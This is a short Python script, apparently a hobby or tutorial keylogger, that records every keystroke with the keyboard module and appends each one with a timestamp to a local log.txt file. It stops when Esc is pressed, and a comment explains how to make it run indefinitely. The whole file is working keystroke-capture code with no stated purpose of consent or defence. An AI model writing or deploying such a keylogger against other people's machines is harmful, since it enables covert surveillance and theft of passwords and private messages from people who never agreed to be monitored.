# using keyboard module to detect keypresses and time module for time logging.
import keyboard as kb
import time

# keylog function records all the keystrokes along with the time at which theu were recorded in a text file named log.
 
def keylog():
    # remove the until parameter and the keylogger will run indefinitely. 
    logger_obj = kb.record(until = 'Esc')
    log_f = open("log.txt",'a')

    log_f.write("\n\n-----------------------Keyboard Log-----------------------\n\n")

    for data in logger_obj:
        curr_time_since_epoch = time.time()
        curr_time = time.ctime(curr_time_since_epoch)
        log_f.write(str(curr_time) + " : "+ str(data) + "\n")

keylog()
